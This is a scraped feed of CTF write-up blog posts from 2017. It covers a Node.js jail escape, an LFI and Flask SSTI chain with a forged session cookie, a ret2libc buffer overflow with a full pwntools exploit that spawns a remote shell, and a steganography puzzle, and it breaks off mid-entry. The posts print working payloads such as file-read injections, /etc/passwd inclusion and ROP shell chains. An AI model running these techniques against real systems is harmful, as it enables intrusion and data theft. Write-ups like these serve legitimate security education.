1","slug":"Pwn-SECTF-Jail-1","date":"2017-09-15T15:08:51.000Z","updated":"2017-09-15T18:26:44.857Z","comments":true,"path":"2017/09/15/Pwn-SECTF-Jail-1/","link":"","permalink":"https://teamrocketist.github.io/2017/09/15/Pwn-SECTF-Jail-1/","excerpt":"","text":"Jail - Pwn (200 + 0)Joey gave you the disk with the file on it and now you’re in jail. They’re charging you with some serious shit, man! Better figure out a way to escape.Solves: 43Service: jail.alieni.se:55542Author: avlidienbrunn A jail escape challenge this time with javascript we need, we can start by sending this so we can view the source code of the current function running: 1234567891011121314151617_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _'_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"|| \"You get one call, UNO.\" | \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" Phone #&gt; this And we get this source code: 1234567891011121314151617181920212223function call(number) &#123; var hangup = process.exit; var line = \"\"; if(number == 911)&#123; console.log(\"Invalid number\"); ask(); return; &#125; var flag,Array,Boolean,Date,global,Error,EvalError,Function,Number,Object,RangeError,ReferenceError,String,SyntaxError,TypeError,URIError,decodeURI,decodeURIComponent,encodeURI,encodeURIComponent,isFinite,isNaN,parseFloat,parseInt,ArrayBuffer,Buffer,DTRACE_HTTP_CLIENT_REQUEST,DTRACE_HTTP_CLIENT_RESPONSE,DTRACE_HTTP_SERVER_REQUEST,DTRACE_HTTP_SERVER_RESPONSE,DTRACE_NET_SERVER_CONNECTION,DTRACE_NET_STREAM_END,DataView,Float32Array,Float64Array,Int16Array,Int32Array,Int8Array,Map,Promise,Proxy,Set,Symbol,Uint16Array,Uint32Array,Uint8Array,Uint8ClampedArray,WeakMap,WeakSet,assert,clearImmediate,clearInterval,clearTimeout,escape,events,require,setImmediate,setInterval,setTimeout,stream,unescape,__defineGetter__,__defineSetter__,__lookupGetter__,__lookupSetter__,constructor,hasOwnProperty,isPrototypeOf,propertyIsEnumerable,toLocaleString,toString,valueOf; if(new RegExp(/[\\[\\]\\.\\\\]/).test(number))&#123; console.log(\"Dangerous characters detected\"); hangup(); return; &#125; arguments = undefined; console.log(\"Calling \"+eval(number)+\"... Nobody picks up!\"); hangup(); &#125; We can see after we send our number the program will end, at the begin of the function we can see the hangup function is being set into process.exit. We have an interesting feature too if we try to call 911 we will jump into ask function: 1234567891011121314151617_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _'_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"|| \"You get one call, UNO.\" | \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" Phone #&gt; ask 12345function ask()&#123; rl.question(template,function(answer)&#123; Jail.call(answer); &#125;);&#125; As we can see the function ask is restarting the program this will come handy later, we have some restriction too RegexExp class is blocking ‘.’, ‘[‘, ‘]’ and ‘\\‘ characters: 12345if(new RegExp(/[\\[\\]\\.\\\\]/).test(number))&#123; console.log(\"Dangerous characters detected\"); hangup(); return;&#125; So how do can we bypass this? my plan was: 12341 - Override RegexExp class to always return true.2 - Recall function call but this time with 911 number(this will restart the program and a this point RegexExp returns always false so we can inject any character we want).3 - Get the current filename.4 - Use process.mainModule.require(&apos;fs&apos;).readFileSync(filename) to read the file and get the flag! Override RegexExpTo override the RegexExp class we can just do this: 1hangup = function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125; 123456789101112131415161718192021222324252627282930313233343536_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _'_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"|| \"You get one call, UNO.\" | \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" Phone #&gt; hangup = function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;Calling function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;... Nobody picks up!Invalid number_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _'_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"|| \"You get one call, UNO.\" | \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" Phone #&gt; Getting the filenameAt this point we can inject any characters we want because the test function will always return false! so lets get the filename: 12345678910111213141516171819202122232425262728293031323334353637_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _&apos;_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;|| &quot;You get one call, UNO.&quot; | &quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; Phone #&gt; hangup = function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;Calling function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;... Nobody picks up!Invalid number_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _&apos;_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;|| &quot;You get one call, UNO.&quot; | &quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; Phone #&gt; __filenameCalling /app/jail.js... Nobody picks up! We have the full path! the javascript file is located in /app/jail.js Read the javascript fileFinally by injecting this after the override process.mainModule.require(‘fs’).readFileSync(‘/app/jail.js’).toString() 123456789101112131415161718192021222324252627282930313233343536373839_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _'_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"|| \"You get one call, UNO.\" | \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" Phone #&gt; hangup = function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;Calling function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;... Nobody picks up!Invalid number_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _'_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"|| \"You get one call, UNO.\" | \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" Phone #&gt; process.mainModule.require('fs').readFileSync('/app/jail.js').toString()Calling var flag = \"SECT&#123;1ts_1n_th4T_pl4Ce_Wh3re_1_Pu7_tH4t_Th1ng_th4T_t1m3,&#125;\"var readline = require('readline');var rl = readline.createInterface(process.stdin, process.stdout); Finally our flag is SECT{1ts_1n_th4T_pl4Ce_Wh3re_1_Pu7_tH4t_Th1ng_th4T_t1m3,}","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"jailescape","slug":"jailescape","permalink":"https://teamrocketist.github.io/tags/jailescape/"},{"name":"sandbox","slug":"sandbox","permalink":"https://teamrocketist.github.io/tags/sandbox/"},{"name":"javascript","slug":"javascript","permalink":"https://teamrocketist.github.io/tags/javascript/"},{"name":"nodejs","slug":"nodejs","permalink":"https://teamrocketist.github.io/tags/nodejs/"}]},{"title":"[Pwn] ASIS - Mary Morton","slug":"Pwn-ASIS-Mary-Morton","date":"2017-09-13T11:25:06.000Z","updated":"2017-09-15T15:45:48.028Z","comments":true,"path":"2017/09/13/Pwn-ASIS-Mary-Morton/","link":"","permalink":"https://teamrocketist.github.io/2017/09/13/Pwn-ASIS-Mary-Morton/","excerpt":"","text":"Mary MortonAverage: 4Rating Count: 20Top 3 Solver 217 DangRanKeYi AlonePoints43Solves142CategoryPwnableDescription: Mary surprises Sherlock with her knowledge and insight into his character, but she had a very obvious vulnerability which Sherlock exploited it, although it was very painful for him! Starting by checking the binary security with checksec: 123$ checksec -f ./mary_mortonRELRO STACK CANARY NX PIE RPATH RUNPATH FORTIFY Fortified Fortifiable FILEPartial RELRO Canary found NX enabled No PIE No RPATH No RUNPATH Yes 0 2 ./mary_morton We have stack canary protection and non executable stack, if we analyse the binary with radare2 we can see it’s protected with a password, we can obtain this using radare2: The password","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"}],"tags":[{"name":"formatstring","slug":"formatstring","permalink":"https://teamrocketist.github.io/tags/formatstring/"},{"name":"stackcanary","slug":"stackcanary","permalink":"https://teamrocketist.github.io/tags/stackcanary/"},{"name":"rop","slug":"rop","permalink":"https://teamrocketist.github.io/tags/rop/"},{"name":"stackoverflow","slug":"stackoverflow","permalink":"https://teamrocketist.github.io/tags/stackoverflow/"}]},{"title":"[Web] ASIS - Golem is stupid!","slug":"Web-ASIS-Golem-is-stupid","date":"2017-09-11T04:08:19.000Z","updated":"2017-09-17T22:37:51.368Z","comments":true,"path":"2017/09/11/Web-ASIS-Golem-is-stupid/","link":"","permalink":"https://teamrocketist.github.io/2017/09/11/Web-ASIS-Golem-is-stupid/","excerpt":"","text":"Average: 4.57Rating Count: 28You Rated: Not ratedTop 3 Solver NYUSEC 0daysober TokyoWesternsPoints41Solves151CategoryWebDescription: Golem is an animated anthropomorphic being that is magically created entirely from inanimate matter, but Golem is stupid! Note that the server was down after the CTF ended I can’t show some pictures of the CTF as I would like.We could easily find a LFI on https://golem.asisctf.com/article?name= : 1curl 'https://golem.asisctf.com/article?name=../../../etc/passwd' We could include the /etc/passwd file, we noticed the website was running on Ngnix so we tried some valid paths paths for the configuration files like this: 1curl 'https://golem.asisctf.com/article?name=../../../etc/nginx/sites-available/golem' And we got this The important part of this config file is here! the path to the python configuration server files: After some trial and error we included the server.py with: 1curl 'https://golem.asisctf.com/article?name=../../../opt/serverPython/golem/server.py' The file is: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#!/usr/bin/pythonimport os from flask import ( Flask, render_template, request, url_for, redirect, session, render_template_string)from flask.ext.session import Session app = Flask(__name__) execfile('flag.py')execfile('key.py') FLAG = flagapp.secret_key = key @app.route(\"/golem\", methods=[\"GET\", \"POST\"])def golem(): if request.method != \"POST\": return redirect(url_for(\"index\")) golem = request.form.get(\"golem\") or None if golem is not None: golem = golem.replace(\".\", \"\").replace(\"_\", \"\").replace(\"&#123;\",\"\").replace(\"&#125;\",\"\") if \"golem\" not in session or session['golem'] is None: session['golem'] = golem template = None if session['golem'] is not None: template = '''&#123;%% extends \"layout.html\" %%&#125; &#123;%% block body %%&#125; &lt;h1&gt;Golem Name&lt;/h1&gt; &lt;div class=\"row&gt; &lt;div class=\"col-md-6 col-md-offset-3 center\"&gt; Hello : %s, why you don't look at our &lt;a href='/article?name=article'&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; &#123;%% endblock %%&#125; ''' % session['golem'] print session['golem'] = None return render_template_string(template) @app.route(\"/\", methods=[\"GET\"])def index(): return render_template(\"main.html\") @app.route('/article', methods=['GET'])def article(): error = 0 if 'name' in request.args: page = request.args.get('name') else: page = 'article' if page.find('flag')&gt;=0: page = 'notallowed.txt' try: template = open('/home/golem/articles/&#123;&#125;'.format(page)).read() except Exception as e: template = e return render_template('article.html', template=template) if __name__ == \"__main__\": app.run(host='0.0.0.0', debug=False) Now the real problem is the flag is in flag.py file but the word flag is filtered: 12if page.find('flag')&gt;=0: page = 'notallowed.txt' We can include the key.py which contains a key, this key according to flask documentation is used to generate session cookies, the included key was 7h15_5h0uld_b3_r34lly53cur3d.If we analyse the golem function we can see its filtering the {, }, . and \\ characters so we can’t template inject code here, well actually if we look closely, if we provide a session cookie “golem” it doesn’t apply this filter but first we need to encrypt the cookie,this is easy because we have the key!We found a python code online that does this after some small modifications we ended up with this: 12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/env pythonfrom flask.sessions import SecureCookieSessionInterfacefrom itsdangerous import URLSafeTimedSerializerimport sysclass SimpleSecureCookieSessionInterface(SecureCookieSessionInterface): # Override method # Take secret_key instead of an instance of a Flask app def get_signing_serializer(self, secret_key): if not secret_key: return None signer_kwargs = dict( key_derivation=self.key_derivation, digest_method=self.digest_method ) return URLSafeTimedSerializer(secret_key, salt=self.salt, serializer=self.serializer, signer_kwargs=signer_kwargs)def decodeFlaskCookie(secret_key, cookieValue): sscsi = SimpleSecureCookieSessionInterface() signingSerializer = sscsi.get_signing_serializer(secret_key) return signingSerializer.loads(cookieValue)# Keep in mind that flask uses unicode strings for the# dictionary keysdef encodeFlaskCookie(secret_key, cookieDict): sscsi = SimpleSecureCookieSessionInterface() signingSerializer = sscsi.get_signing_serializer(secret_key) return signingSerializer.dumps(cookieDict)if __name__=='__main__': sk = '7h15_5h0uld_b3_r34lly_53cur3d' sessionDict = &#123;u'golem':sys.argv[1]&#125; cookie = encodeFlaskCookie(sk, sessionDict) decodedDict = decodeFlaskCookie(sk, cookie) print cookie We tried to read the flag.py via template python code but we failed hard, after that I stopped and decided to read about some global variables on flask documentation(http://flask.pocoo.org/docs/0.12/templating/), and we found a config global variable we included and the flag was in the dictionary attribute ‘flag’: 12345$ python manageFlaskSession.py \"&#123;&#123; config &#125;&#125;\"eyJnb2xlbSI6eyIgYiI6ImUzc2dZMjl1Wm1sbklIMTkifX0.DJeaSw.hiqTyJ7xj6WCZEX87xbKa48Bjkc$ curl 'https://golem.asisctf.com/golem' -H 'Cookie: session=eyJnb2xlbSI6eyIgYiI6ImUzc2dZMjl1Wm1sbklIMTkifX0.DJeaSw.hiqTyJ7xj6WCZEX87xbKa48Bjkc' --data ''&#123;--omited--,'flag':'ASIS&#123;I_l0v3_SerV3r_S1d3_T3mplate_1nj3ct1on!!&#125;',--omited--&#125;","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"flask","slug":"flask","permalink":"https://teamrocketist.github.io/tags/flask/"},{"name":"pythonserver","slug":"pythonserver","permalink":"https://teamrocketist.github.io/tags/pythonserver/"},{"name":"ssti","slug":"ssti","permalink":"https://teamrocketist.github.io/tags/ssti/"},{"name":"lfi","slug":"lfi","permalink":"https://teamrocketist.github.io/tags/lfi/"},{"name":"sessionkey","slug":"sessionkey","permalink":"https://teamrocketist.github.io/tags/sessionkey/"},{"name":"cookies","slug":"cookies","permalink":"https://teamrocketist.github.io/tags/cookies/"}]},{"title":"[Pwn] ASIS - Mrs. Hudson","slug":"Pwn-ASIS-Mrs-Hudson","date":"2017-09-10T20:01:59.000Z","updated":"2017-09-11T05:17:41.681Z","comments":true,"path":"2017/09/10/Pwn-ASIS-Mrs-Hudson/","link":"","permalink":"https://teamrocketist.github.io/2017/09/10/Pwn-ASIS-Mrs-Hudson/","excerpt":"","text":"Average: 2.94Rating Count: 17Top 3 Solver dodododo RPISEC TokyoWesternsPoints54Solves103CategoryPwnableDescription: England would fall if Mrs. Hudson leaves Baker Street. Mrs. Hudson is the first one who is totally exploited by Sherlock, or Does She? nc 178.62.249.106 8642 nc 146.185.168.172 8642 Lets start by checking the security of the binary (https://github.com/slimm609/checksec.sh): 123$ checksec -f ./mrs._hudsonRELRO STACK CANARY NX PIE RPATH RUNPATH FORTIFY Fortified Fortifiable FILEPartial RELRO No canary found NX disabled No PIE No RPATH No RUNPATH No 0 0 ./mrs._hudson We don’t have any kind of protections so analysing it with radare2 The binary is pretty simple we have a scanf in the end, with it we can overflow the buffer…My plan was: 123451 - overflow the buffer and leak puts address.2 - search in the libc-database for a libc.so.3 - calculate system address and binsh address.4 - jump to main again.5 - overflow the buffer and jump to system(&apos;/bin/sh&apos;). Calculate the offset to RIPWe can use metasploit(to create the patterns) and gdb but first lets see the address of the ret instruction in assembly: 123| 0x00400680 e89bfeffff call sym.imp.__isoc99_scanf ; int scanf(const char *format)| 0x00400685 c9 leave\\ 0x00400686 c3 ret And now generate the patterns and use gdb to calculate the offset 12345678910111213$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag$ gdb ./mrs._hudsonpwndbg&gt; b *0x00400686pwndbg&gt; rLet's go back to 2000.Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9pwndbg&gt; x $rsp0x7fffffffde08: 0x6541316541306541$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6541316541306541[*] Exact match at offset 120 The offset is 120. Leak puts addressWe have to leak the libc address from puts, we can do this by using puts_plt and puts_got addresses with return oriented programming, keep in mind that in x86 parameters are stored on the stack, but in x64 the first six parameters are saved in RDI, RSI, RDX, RCX, R8 and R9, if there are more parameters will be saved on the stack. So if we want to build the Rop chain to call puts we should first POP RDI RET so we save the next value in the stack to RDI. To find the POP RDI; RET gadget we can use ROPgadgets: 123456789101112131415$ ROPgadget --binary ./mrs._hudson --only \"pop|ret\"Gadgets information============================================================0x00000000004006ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006ee : pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006f0 : pop r14 ; pop r15 ; ret0x00000000004006f2 : pop r15 ; ret0x00000000004006eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006ef : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400575 : pop rbp ; ret0x00000000004006f3 : pop rdi ; ret0x00000000004006f1 : pop rsi ; pop r15 ; ret0x00000000004006ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004004ee : ret0x00000000004005a5 : ret 0xc148 Now start building our exploit to leak puts libc address: 1234567891011121314151617181920212223from pwn import *binary = ELF('./mrs._hudson')local = TruePOPRET = 0x00000000004006f3PUTSPLT = binary.plt['puts']PUTSGOT = binary.got['puts']padding = 'A' * 120ropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(PUTSGOT) # PUTS ADDRESS ARG[1]ropchain += p64(PUTSPLT) # PUTS function \"call\"r = process('./mrs._hudson') if local else remote('178.62.249.106', 8642)r.recvline()r.sendline(padding + ropchain)PUTS = u64(r.recv(0x6).ljust(8, '\\x00'))log.info(\"PUTS 0x%x\" % PUTS) Search libc-databaseWe can user this libc-database and try to find a lib to corresponds to our puts leaked address: 1234567891011121314$ python mrs._hudson.py[*] &apos;~/ctf/asis/pwn/mrs._hudson&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments[+] Opening connection to 178.62.249.106 on port 8642: Done[*] Puts 0x7fc73fd10690$ ./find puts 0x7fc73fd10690 #libc-database folderubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu9_amd64)~/ctf/tokyo/pwn/swap/libc.so.6 (id local-14c22be9aa11316f89909e4237314e009da38883) It was funny because it was the same libc.so of a challenge I did previously in tokyo westerns. Calculate libcbase and other addressesNow that we have the lib.so.6 we can now use extract from it the offsets using pwntools: 1234567891011121314151617181920212223242526272829binary = ELF('./mrs._hudson')libc = ELF('libc.so.6') # got libc from libc-databaselocal = FalsePOPRET = 0x00000000004006f3PUTSPLT = binary.plt['puts']PUTSGOT = binary.got['puts']padding = 'A' * 120ropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(PUTSGOT) # PUTS ADDRESS ARG[1]ropchain += p64(PUTSPLT) # PUTS function \"call\"ropchain += p64(MAIN) # MAIN function \"call\"r = process('./mrs._hudson', env = &#123;\"LD_PRELOAD\":\"./libc.so.6\"&#125;) if local else remote('178.62.249.106', 8642)r.recvline()r.sendline(padding + ropchain)PUTS = u64(r.recv(0x6).ljust(8, '\\x00'))LIBCBASE = PUTS - libc.symbols['puts']SYSTEM = LIBCBASE + libc.symbols['system']BINSH = LIBCBASE + 0x18cd17log.info(\"LIBC 0x%x\" % LIBCBASE)log.info(\"LIBC 0x%x\" % PUTS)log.info(\"SYSTEM 0x%x\" % SYSTEM)log.info(\"Binsh 0x%x\" % (BINSH)) Return to main and jump to system(‘/bin/sh’)First lets get the main address from radare2: 12345678 ;-- main:/ (fcn) sym.main 109| sym.main ();| ; var int local_80h @ rbp-0x80| ; var int local_74h @ rbp-0x74| ; var int local_70h @ rbp-0x70| ; DATA XREF from 0x0040054d (entry0)| 0x0040061a 55 push rbp We add MAIN to our rop chain, after we execute puts, we jump to main again: 123456MAIN = 0x000000000040061Aropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(PUTSGOT) # PUTS ADDRESS ARG[1]ropchain += p64(PUTSPLT) # PUTS function \"call\"ropchain += p64(MAIN) # MAIN function \"call\" And now the final exploit: 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *import struct import timedef getConn(): return process('./mrs._hudson', env = &#123;\"LD_PRELOAD\":\"./libc.so.6\"&#125;) if local else remote('178.62.249.106', 8642)binary = ELF('./mrs._hudson')libc = ELF('libc.so.6') # got libc from libc-databaselocal = FalsePOPRET = 0x00000000004006f3PUTSPLT = binary.plt['puts']PUTSGOT = binary.got['puts']MAIN = 0x000000000040061Apadding = 'A' * 120ropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(PUTSGOT) # PUTS ADDRESS ARG[1]ropchain += p64(PUTSPLT) # PUTS function \"call\"ropchain += p64(MAIN) # MAIN function \"call\"r = getConn()r.recvline()r.sendline(padding + ropchain)PUTS = u64(r.recv(0x6).ljust(8, '\\x00'))LIBCBASE = PUTS - libc.symbols['puts']SYSTEM = LIBCBASE + libc.symbols['system']BINSH = LIBCBASE + 0x18cd17log.info(\"LIBC 0x%x\" % LIBCBASE)log.info(\"PUTS 0x%x\" % PUTS)log.info(\"SYSTEM 0x%x\" % SYSTEM)log.info(\"Binsh 0x%x\" % (BINSH))r.recvline()r.recvline()r.sendline(padding + p64(POPRET) + p64(BINSH) + p64(SYSTEM))r.interactive()r.close() Run and get the flag: 123456789101112131415161718192021222324252627$ python mrs._hudson.py[*] '~/ctf/asis/pwn/mrs._hudson' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments[*] '~/ctf/asis/pwn/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Opening connection to 178.62.249.106 on port 8642: Done[*] LIBC 0x7ff6d2ec0000[*] PUTS 0x7ff6d2f2f690[*] SYSTEM 0x7ff6d2f05390[*] Binsh 0x7ff6d304cd17[*] Switching to interactive mode$ ls homefrontofficemanager$ ls home/frontofficemanagerflaghudson_3ab429dd29d62964e5596e6afe0d17d9$ cat home/frontofficemanager/flagASIS&#123;W3_Do0o_N0o0t_Like_M4N4G3RS_OR_D0_w3?&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"rop","slug":"rop","permalink":"https://teamrocketist.github.io/tags/rop/"},{"name":"bufferOverflow","slug":"bufferOverflow","permalink":"https://teamrocketist.github.io/tags/bufferOverflow/"},{"name":"ret2libc","slug":"ret2libc","permalink":"https://teamrocketist.github.io/tags/ret2libc/"}]},{"title":"[Stego] ASIS - ASIS secret letter","slug":"Stego-ASIS-ASIS-secret-letter","date":"2017-09-10T18:10:59.000Z","updated":"2017-09-10T18:46:40.288Z","comments":true,"path":"2017/09/10/Stego-ASIS-ASIS-secret-letter/","link":"","permalink":"https://teamrocketist.github.io/2017/09/10/Stego-ASIS-ASIS-secret-letter/","excerpt":"","text":"ASIS secret letterAverage: 4.17Rating Count: 6You Rated: 5Top 3 Solver Teamrocketist dcua CodiSecPoints202Solves17CategoryMisc StegoDescription: The face is the index of the mind, its ASIS secret letter! We have two images lets use binwalk on the jpg image: 1234567$ binwalk a.jpg DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 JPEG image data, JFIF standard 1.0130 0x1E TIFF image data, big-endian, offset of first image directory: 856 0x38 Zlib compressed data, default compression Doesn’t look like it has something special so lets extract the files using binwalk again but with the parameter e: 123456$ binwalk -e a.jpgDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 JPEG image data, JFIF standard 1.0130 0x1E TIFF image data, big-endian, offset of first image directory: 856 0x38 Zlib compressed data, default compression Binwalk will create a folder with extracted files: 12$ ls_a.jpg.extracted/38 38.zlib Checking the 38 file we can see we have a double encoded base64 string: 12$ cat 38 | base64 -d | base64 -d💌 from ASIS with love, please find secret message and reply soon, powered by 👉 Stéganô 👈⏎ Stéganô is a python package for steganography which can be found here https://github.com/cedricbonhomme/Stegano Now using stegano to extract something from png, there was two binaries in stegano we tried with stegano-lsb but it didn’t work so we tried with stegano-lsb-set with the generator triangular_numbers: 12$ Stegano/bin/stegano-lsb-set reveal -i e07d17ed7d8104590ff3e17bdf052057.png -g triangular_numbersASIS&#123;767ba85340d9e49fa0bb9c2b12037f08&#125; And we got the flag!","categories":[{"name":"Stego","slug":"Stego","permalink":"https://teamrocketist.github.io/categories/Stego/"}],"tags":[{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"stego","slug":"stego","permalink":"https://teamrocketist.github.io/tags/stego/"},{"name":"stegano","slug":"stegano","permalink":"https://teamrocketist.github.io/tags/stegano/"},{"name":"binwalk","slug":"binwalk","permalink":"https://teamrocketist.github.io/tags/binwalk/"}]},{"title":"[Pwn] Tokyo Westerns CTF 3rd 2017 - Swap","slug":"Pwn-Tokyo-Westerns-CTF-3rd-2017-Swap","date":"2017-09-07T02:47:20.000Z","updated":"2017-09-07T04:52:15.777Z","comments":true,"path":"2017/09/07/Pwn-Tokyo-Westerns-CTF-3rd-2017-Swap/","link":"","permalink":"https://teamrocketist.github.io/2017/09/07/Pwn-Tokyo-Westerns-CTF-3rd-2017-Swap/","excerpt":"","text":"The swapping is interesting. Let’s try!nc pwn1.chal.ctf.westerns.tokyo 19937swaplibc.so.6 We are given an 64 bit ELF for Linux x86-64: 12$ file swapswap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=74448e9fb5920898de1f9b5115c764eff1c8edac, not stripped We decompile it using ida’s pseudo c converter: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; int v3; 